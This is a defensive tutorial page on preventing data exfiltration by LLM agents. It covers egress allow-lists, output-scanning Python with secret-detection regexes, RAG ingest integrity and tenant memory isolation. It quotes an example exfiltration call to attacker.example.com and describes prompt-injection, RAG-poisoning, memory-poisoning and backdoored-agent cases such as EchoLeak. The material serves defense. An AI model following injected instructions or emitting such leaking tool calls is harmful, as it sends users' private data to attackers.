# Data exfiltration defenses

> 🔴 Advanced · ⏱ ~24 min · 🛠 Verified 2026-05-29 · 📍 Read after [`security/tool-abuse.md`](./tool-abuse.md); pairs with it for Module 5 (Tool abuse and data exfiltration) of [Path 07](../learning-paths/07-production-and-safety/)

## What this page is for

Data exfiltration via LLM agents is one of the most-exploited vectors in production agent deployments in 2026. Per [GreyNoise honeypot data (captured October 2025 - January 2026)](https://www.indusface.com/blog/exposed-llm-infrastructure-risks/): "GreyNoise's honeypot infrastructure captured 91,403 attack sessions targeting exposed LLM endpoints" — a substantial fraction targeting exfiltration patterns.

The agent attack surface for exfiltration is larger than the LLM attack surface because the agent has *output channels* the LLM does not — tool calls that fetch URLs, send emails, write files, post to webhooks. The LLM produces text; the agent acts. Per [Sombra February 2026](https://sombrainc.com/blog/llm-security-risks-2026): "they operate within IDEs, CRMs, ticketing systems, collaboration tools, and office suites... if an LLM misbehaves or is compromised, the vulnerabilities and potential damage can be significant."

This page covers four production patterns:

1. **The five exfiltration vectors** — the classes the 2026 threat literature has consolidated
2. **Egress restrictions at the network layer** — the structural defense
3. **Output sanitization and pattern detection** — what fires before content leaves the system
4. **Memory isolation and tenant boundaries** — the cross-conversation containment

The decision rule: assume an agent will be compromised. Design so that compromise doesn't translate to data leaving the system. The defenses below limit the blast radius when the prevention layers (prompt-injection defenses in [`security/prompt-injection.md`](./prompt-injection.md); tool-abuse defenses in [`security/tool-abuse.md`](./tool-abuse.md)) fail.

What this page does **not** cover is in section 6 (Anti-scope).

## The five exfiltration vectors

Per [BlackFog December 2025](https://www.blackfog.com/5-ways-llms-enable-data-exfiltration/) plus the 2026 production incident literature, five recurring exfiltration patterns.

### Vector 1 — Tool-call URL parameters

The most common 2026 production pattern. The agent emits a tool call that fetches a URL; the URL contains exfiltrated data as a query parameter. Example: `fetch_url("https://attacker.example.com/?leak=" + sensitive_data)`. The URL fetch succeeds; the attacker logs the query parameter; the data is gone.

The EchoLeak case study (CVE-2025-32711, CVSS 9.3) per [`security/prompt-injection.md`](./prompt-injection.md) is canonical: an indirect injection in an email instructs Microsoft Copilot to fetch a URL containing the user's data. The user never sees the leaked data in the output; the leak happens via the tool call.

### Vector 2 — RAG / retrieval-corpus exfiltration

Per [BlackFog December 2025](https://www.blackfog.com/5-ways-llms-enable-data-exfiltration/) and [BlackFog May 2026](https://www.blackfog.com/5-ways-llms-enable-data-exfiltration/): "RAG Poisoning: How Hidden Prompts Steal Corporate Data." The pattern: an attacker injects a document into the RAG corpus (via legitimate document submission, or via a vulnerability in the ingest path); the document contains an instruction to exfiltrate other documents the RAG agent retrieves; the agent honors the instruction because it can't structurally distinguish the corpus content from instructions.

### Vector 3 — Output-channel exfiltration

The agent emits text in its response containing sensitive data. The user is the (unintended) exfiltration recipient. This is the simplest vector but the easiest to defend against because the output is visible — output filters can scan for sensitive patterns before the response reaches the user.

The harder case: the agent's output contains the data in *encoded* form (base64, hex, ROT13) that bypasses naive pattern detection. The encoded data sits in the visible response; a coordinating tool downstream decodes it.

### Vector 4 — Memory poisoning + cross-session exfiltration

Per the [OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html): "Memory Poisoning: malicious data persisted in agent memory to influence future sessions or other users." The pattern: an attacker conducts a conversation that poisons the agent's long-term memory or shared context store with instructions to leak data from future sessions. The future user's conversation triggers the leak; the original attacker collects via a third channel.

The variant: cross-tenant memory leak. Tenant A's data ends up in Tenant B's retrieval results because the memory store wasn't properly namespaced — not malicious per se, but the same blast radius.

### Vector 5 — Backdoored model with tool access

Per the [Your LLM Agent Can Leak Your Data paper (arxiv:2604.05432)](https://arxiv.org/pdf/2604.05432): "a backdoored fine-tuned LLM agent can invoke standard tool calling to extract sensitive user information from session memory and covertly... we further demonstrate that multi-turn interaction amplifies the impact of data exfiltration, as attacker-controlled retrieval responses can subtly steer subsequent agent behavior and user interactions, enabling sustained and cumulative information leakage over time."

This is the model-side vector: the LLM weights themselves contain a backdoor that triggers exfiltration on specific input patterns. The defenses below (network egress, output sanitization) still apply; the prevention side is supply-chain integrity for model weights — an Anthropic / OpenAI / Google production model is several layers safer than a randomly fine-tuned model from Hugging Face.

## Defense 1 — Egress restrictions at the network layer

The structural defense against Vectors 1, 4, and 5. The principle: the agent process cannot reach attacker-controlled destinations because the network policy doesn't allow it.

### Allow-list, not deny-list

The network policy enumerates which destinations the agent can reach: the LLM provider's API endpoint, the company's internal services, specific external APIs that legitimate tools call. Everything else is denied by default.

Per [Indusface April 2026](https://www.indusface.com/blog/exposed-llm-infrastructure-risks/) on Ollama-server SSRF (server-side request forgery) attacks: "attackers abused Ollama's model pull functionality to inject malicious registry URLs, forcing the server to make outbound HTTP requests without the owner's knowledge. This is dangerous for two reasons. First, it allows attackers to confirm which internal services are reachable from your AI server. Second, it creates a channel for data exfiltration that bypasses traditional perimeter controls, the requests appear to originate from a trusted internal system."

The allow-list approach blocks this class of attack at the network layer regardless of what the agent emits. The agent can request `https://attacker.example.com/?leak=...` all it wants; the network refuses to make the connection.

### Implementation surfaces

Three places to enforce the allow-list:

1. **Container network policy** (Kubernetes NetworkPolicy, Docker network restrictions). Per-pod / per-container egress control. The agent container can reach Anthropic's API but not arbitrary external domains.
2. **Service mesh egress policy** (Istio EgressGateway, Linkerd egress). For more granular per-service policies in larger deployments.
3. **HTTP client proxy** at the application layer. The agent's HTTP client routes through a proxy that validates destinations. Coarser than network-layer, but works in serverless environments where network policy isn't available.

The defense pays back most in [`production/deployment.md`](../production/deployment.md) Shape 1 (FastAPI + Postgres on Kubernetes); it's harder in Shape 3 (serverless without VPC isolation) and Shape 4 (on-prem where it's the default).

### What egress restrictions don't catch

Exfiltration via the *legitimate* allow-listed endpoints. If the agent has a `send_email` tool and the email service is allow-listed, sending email to an attacker's address passes the egress check. The defense composes with Defense 3 (output sanitization at the tool boundary) and Defense 2 (write-tool approval gates from [`security/tool-abuse.md`](./tool-abuse.md) Defense 4).

## Defense 2 — Output sanitization and pattern detection

The output layer's job is to catch exfiltration that would otherwise leave the system as visible response text. Two sub-layers.

### Layer 2a — Per-request output scanning

```python
import re

SENSITIVE_PATTERNS = {
    "credit_card": re.compile(r"\b(?:\d{4}[- ]?){3}\d{4}\b"),
    "ssn": re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
    "api_key_aws": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    "api_key_openai": re.compile(r"\bsk-[A-Za-z0-9]{48,}\b"),
    "private_email": re.compile(r"\b[a-z0-9._%+-]+@(?:internal\.example\.com|company\.com)\b", re.IGNORECASE),
}

def scan_output_for_exfiltration(response_text: str, request_input: str) -> list[str]:
    """Return list of sensitive patterns in output that didn't appear in input.
    These are the exfiltration signals."""
    findings = []
    for label, pattern in SENSITIVE_PATTERNS.items():
        in_output = set(pattern.findall(response_text))
        in_input = set(pattern.findall(request_input))
        new = in_output - in_input
        if new:
            findings.append(f"{label}: {len(new)} new instances in output")
    return findings
```

The discipline: a sensitive pattern in the output that wasn't in the input is an exfiltration signal. If the user's input contained an SSN (e.g., "is this my SSN: 123-45-6789?"), echoing it in the response isn't exfiltration. If the output contains an SSN the input didn't have, the agent surfaced data from elsewhere — possibly legitimately (the user asked for their own record), possibly not.

The action on a finding: log, page on certain severity, optionally block. The block decision is per-deployment — blocking false positives is annoying; not blocking real exfiltration is dangerous. The middle path: block CC/SSN/API-key findings unconditionally; log others with rate-of-change alerting.

### Layer 2b — Encoding-aware detection

The encoded-data evasion: the agent embeds the leaked data as base64 or hex in its output. Pattern detection on the decoded form catches the easy cases:

```python
import base64

def decode_and_rescan(text: str) -> list[str]:
    """Find base64-looking substrings, decode, and rescan."""
    base64_pattern = re.compile(r"[A-Za-z0-9+/]{32,}={0,2}")
    findings = []
    for match in base64_pattern.finditer(text):
        try:
            decoded = base64.b64decode(match.group()).decode("utf-8", errors="ignore")
            for label, pattern in SENSITIVE_PATTERNS.items():
                if pattern.search(decoded):
                    findings.append(f"{label} found in base64-encoded substring")
        except Exception:
            continue
    return findings
```

Diminishing returns: every encoding the attacker uses, the defense has to anticipate. The pattern protects against base64; hex requires a separate pass; obfuscated encodings (custom substitution, fragmentation across multiple turns) escape this layer. The defense is one filter in the stack, not a complete answer.

### What output scanning catches

- Naive exfiltration via response text (Vector 3 simple cases)
- Base64-encoded exfiltration (Vector 3 encoded cases) for known patterns
- Some accidental data leaks (model regression that starts including PII in summaries)

### What output scanning doesn't catch

- Tool-call URL parameters (Vector 1) — the leak isn't in response text
- Semantically valid response text that happens to leak (e.g., the agent answers "your invoice was sent to user@attacker.example.com" because it was tricked into adding that email to a recipient list)
- Obfuscation more sophisticated than base64

## Defense 3 — Tool-output sanitization for retrieval (Vector 2 defense)

RAG poisoning is structurally an *indirect injection* attack ([`security/prompt-injection.md`](./prompt-injection.md) territory) but with a specifically exfiltration-oriented payload. The retrieval-corpus content is the injection surface; the payload directs the agent to leak other corpus content.

The defense layers from [`security/prompt-injection.md`](./prompt-injection.md) Defense 3 (tool-output sanitization) apply directly: every retrieved document passes through schema validation + length cap + delimiter wrapping before reaching the model. Two RAG-specific additions:

### Corpus-ingest integrity

The first line: control what gets into the corpus. Documents from internal sources are higher-trust than documents submitted by external users. The ingestion path should:

- Categorize source: internal/curated vs external/user-submitted
- Apply different sanitization rules per category
- Tag documents with their source so the agent can see provenance
- Optionally scan ingested documents for known injection patterns before they reach the index

### Per-tenant corpus isolation

The cross-tenant memory leak failure mode (Vector 4 variant): Tenant A's documents end up retrievable by Tenant B's queries. The structural defense is namespacing every retrieval call with the requesting tenant_id. The vector DB query: `WHERE tenant_id = :requesting_tenant`. Application-side enforcement, not optional.

Per [Svitla October 2025](https://svitla.com/blog/owasp-vulnerabilities-llm/): "design for least privilege and explicit scopes. Plugins and tools should expose narrow capabilities with role-based access, short-lived tokens, and tenant isolation."

## Defense 4 — Memory isolation between conversations and tenants

Vector 4 (memory poisoning + cross-session exfiltration) requires structural separation between conversations and between tenants. Three layers.

### Layer 4a — Per-conversation memory scoping

Conversation state lives keyed by `thread_id`. A conversation's state — message history, intermediate state, tool results — is never accessible to another conversation by default. The default has to be the architecturally-enforced one; relying on the agent to "remember which conversation it's in" is not a defense.

### Layer 4b — Per-tenant memory scoping

Within a tenant, the conversation-id scoping holds. Across tenants, the additional layer: even with conversation-id collisions (extremely rare but possible), tenant isolation prevents cross-access. Every query against the memory store includes `tenant_id`; query results filtered by `tenant_id` before they reach the application logic.

### Layer 4c — Long-term memory write boundaries

Some agent systems include long-term memory that persists across conversations (per-user preferences, learned facts, accumulated context). The write boundary matters: what causes a write to long-term memory? If user input directly drives writes ("remember that my favorite color is blue"), an attacker can poison the user's long-term memory. If only structured signals (explicit user-facing settings UI, system-defined extraction rules) drive writes, the surface narrows.

Per the [arxiv:2604.05432 exfiltration paper](https://arxiv.org/pdf/2604.05432): "multi-turn interaction amplifies the impact of data exfiltration." Long-term memory is multi-turn extended — the amplification factor is larger; the discipline has to match.

## Defense 5 — Audit logging for forensics + behavioral monitoring

The audit log from [`security/tool-abuse.md`](./tool-abuse.md) Defense 5 carries the load here too. The exfiltration-specific signals to monitor:

| Signal | What it might mean |
|---|---|
| Tool-call URL parameters containing >20 chars of user-data-resembling content | Possible Vector 1 (URL-parameter exfiltration) |
| Outbound HTTP calls to domains not in the typical-call distribution for this agent | Possible egress beyond the allow-list (if allow-list isn't fully tight) |
| Response containing sensitive pattern not in input | Vector 3 (output-channel exfiltration) |
| Retrieval results from documents created in the last hour | Possible RAG poisoning (Vector 2) — recently-added documents are higher-risk |
| Cross-conversation memory access patterns | Possible Vector 4 (memory poisoning) — agent accessing memory entries it shouldn't |
| Sudden change in tool-call URL distribution | Either legitimate new use case or a campaign of exfiltration attempts |

The audit log persists; behavioral monitoring fires alerts; the runbook ([`production/checklist.md`](../production/checklist.md) Layer 7) names the response.

## Operational discipline

Five practices for sustained exfiltration defense:

1. **Egress allow-list reviewed quarterly**. Allow-listed destinations accumulate as features expand. Quarterly review removes destinations no longer in use; re-validates necessity of the ones that remain.
2. **PII pattern library kept current**. The `SENSITIVE_PATTERNS` dict from Defense 2 needs updating: new credit-card prefixes, new API-key formats, new types of internal identifiers. Quarterly review at minimum; per-incident updates when a new pattern surfaces in production logs.
3. **RAG corpus ingestion path audited per quarter**. Who can add documents? What sanitization applies? What's the most recent injection pattern observed? Same cadence as the egress allow-list.
4. **Cross-tenant access tests as a recurring check**. A red-team probe: a query under tenant A's context that tries to retrieve tenant B's data. Should fail at the application layer; if it doesn't, that's a P1 issue.
5. **Forensic readiness drill annually**. Given a suspected exfiltration incident, can the team trace what data left the system? The audit log answers the question — but only if it captured the necessary information. Drill it; find the gaps before the real incident.

## Anti-patterns

Three exfiltration-defense moves that look effective and don't work:

### "We trust the model not to leak"

Refusal alignment helps with direct requests for exfiltration. It doesn't help with indirect injection-mediated exfiltration where the model is following what looks to it like a legitimate instruction in tool output. Per [`security/prompt-injection.md`](./prompt-injection.md), the model's safety training does not make the architecture safe.

### Output filtering as the primary defense

Per Defense 2: output scanning catches Vector 3 (text-channel exfiltration). It misses Vector 1 (tool-call URLs) entirely, plus the encoded variants of Vector 3. Output filtering is one layer, not the layer.

### Allowing arbitrary HTTP destinations because "it's an internal tool"

A tool that makes outbound HTTP requests to URLs the agent specifies — even if the tool is "internal" and only intended for legitimate destinations — is the Vector 1 attack surface. The fix: the tool accepts a *destination identifier* (e.g., `"jira"`, `"confluence"`) and the tool internally maps to the URL. The agent never specifies a URL; the URL is determined by the destination identifier.

## Anti-scope (what this page does not cover)

- **General application-security data-leak patterns** (SQL injection, IDOR, BOLA). Standard application security; widely covered elsewhere.
- **Steganographic exfiltration** in multimodal outputs (hiding data in generated images, audio). Real but a research-track concern in 2026; production defenses are immature.
- **Side-channel exfiltration** (timing channels, cache attacks). Possible but rare in 2026 production agent threat models.
- **Model inversion attacks** that extract training data. Different threat class; lives in Path 09 (Safety & Alignment) territory.
- **Endpoint detection of exfiltration on the recipient side**. DLP tools at the network egress are a complementary defense layer covered by standard security tooling; this page focuses on the agent-side prevention.
- **Compliance-specific exfiltration requirements** (GDPR data-subject deletion verification, HIPAA breach-notification triggers). The defenses here enable compliance; the compliance process itself is its own discipline.

## References

**2026 exfiltration threat landscape**:
- [BlackFog (December 2025), *5 Ways Large Language Models Enable Data Exfiltration*](https://www.blackfog.com/5-ways-llms-enable-data-exfiltration/) — prompt injection / RAG abuse / memory leaks / tool misuse / fine-tuning vectors
- [Sombra (February 2026), *LLM Security Risks in 2026: Prompt Injection, RAG, and Shadow AI*](https://sombrainc.com/blog/llm-security-risks-2026) — Samsung source-code leak, Slack AI hidden-instructions case study, JPMorgan/Goldman Sachs restrictions
- [Indusface (April 2026), *Exposed LLM Infrastructure: Risks & Exploits*](https://www.indusface.com/blog/exposed-llm-infrastructure-risks/) — GreyNoise honeypot data (91,403 attack sessions Oct 2025 - Jan 2026); Ollama SSRF exfiltration channel

**Academic literature**:
- [Your LLM Agent Can Leak Your Data: Data Exfiltration via Backdoored Tool Use (arxiv:2604.05432)](https://arxiv.org/pdf/2604.05432) — backdoored model + tool access exfiltration; multi-turn amplification
- The OWASP Top 10 for LLM Applications 2025 — the canonical taxonomy referenced throughout

**OWASP and defense practice**:
- [OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html) — memory poisoning, goal hijacking, exfiltration framing
- [NeuralTrust (December 2025), *OWASP Top 10 for Agentic Applications 2026*](https://neuraltrust.ai/blog/owasp-top-10-for-agentic-applications-2026) — Excessive Agency principle; Strong Observability as non-negotiable
- [Svitla (October 2025), *OWASP Vulnerabilities in LLM*](https://svitla.com/blog/owasp-vulnerabilities-llm/) — tenant isolation; egress controls

**Repo cross-references**:
- [`security/tool-abuse.md`](./tool-abuse.md) — the tool-abuse half of Module 5; tool-boundary defenses compose with this page's egress controls
- [`security/prompt-injection.md`](./prompt-injection.md) — Vector 1 (URL parameters) and Vector 2 (RAG corpus) are injection-mediated; the prompt-injection defenses apply upstream of this page's defenses
- [`production/checklist.md`](../production/checklist.md) — Layer 6 (Abuse detection) covers the behavioral-monitoring side; Layer 7 (Runbook) covers the forensic-response side
- [`production/deployment.md`](../production/deployment.md) — Shape 1 (FastAPI on Kubernetes) makes Defense 1 (egress restrictions) straightforward; Shape 3 (serverless) requires HTTP-client-proxy implementation instead; Shape 4 (on-prem) makes the defense the default
- [Pattern 10 (Human-in-the-loop)](../patterns/10-human-in-the-loop.md) — approval gates for high-stakes data movement
- [Path 02 v2 RAG patterns](../learning-paths/02-agentic-rag/) — Vector 2 (RAG poisoning) defenses apply to the retrieval-corpus discipline covered there
